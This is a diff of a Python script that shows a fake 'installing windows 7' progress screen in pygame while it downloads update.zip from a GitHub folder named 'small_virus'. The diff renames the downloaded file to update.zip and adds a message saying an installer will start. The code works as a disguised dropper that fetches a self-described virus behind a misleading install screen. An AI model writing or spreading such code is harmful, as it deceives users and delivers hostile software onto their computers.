@@ -1,7 +1,7 @@
 import os
 os.system('cls')
 print('checking dependencies...')
-os.system('python -m pip install requests tqdm pygame')
+os.system('python -m pip install requests tqdm pygame ffpyplayer')
 import pygame
 import requests
 import zipfile
@@ -78,7 +78,7 @@ def main():
 
     # 下载文件
     url = 'https://github.com/huluobuo/filesss-huluobuo/raw/refs/heads/main/small_virus/Windows_7_Song_of_Death/update.zip'
-    output_path = 'error.zip'
+    output_path = 'update.zip'
 
     progress = 0
 
@@ -139,7 +139,10 @@ def main():
         pygame.draw.rect(screen, (0, 120, 215), (progress_bar_x, progress_bar_y, progress_bar_width * (progress / 100), progress_bar_height))
 
         # 绘制进度文本
-        progress_text = font.render(f'installing windows 7 - {int(progress)}%', True, (255, 255, 255))
+        if progress < 100:
+            progress_text = font.render(f'installing windows 7 - {int(progress)}%', True, (255, 255, 255))
+        else:
+            progress_text = font.render('done - will start installer, please wait', True, (255, 255, 255))
         text_rect = progress_text.get_rect(center=(screen_width / 2, progress_bar_y + progress_bar_height / 2 + 75))
         screen.blit(progress_text, text_rect)
 
